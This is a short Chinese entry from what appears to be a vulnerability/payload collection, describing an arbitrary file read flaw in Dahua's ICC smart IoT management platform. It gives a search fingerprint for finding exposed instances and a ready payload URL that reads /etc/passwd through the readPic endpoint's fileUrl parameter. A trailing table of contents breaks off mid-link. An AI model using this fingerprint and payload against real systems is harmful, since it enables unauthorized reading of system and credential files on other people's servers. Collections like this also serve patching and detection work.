# 大华智能物联综合管理平台(ICC)存在任意文件读取漏洞

大华 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`web.body="*客户端会小于800*"`

**Payload**
```
/evo-apigw/evo-cirs/file/readPic?fileUrl=file:/etc/passwd
```
- **其他**：大华智能物联综合管理平台(ICC)存在任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* [四、漏洞复现](#%E5%9B%9B%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E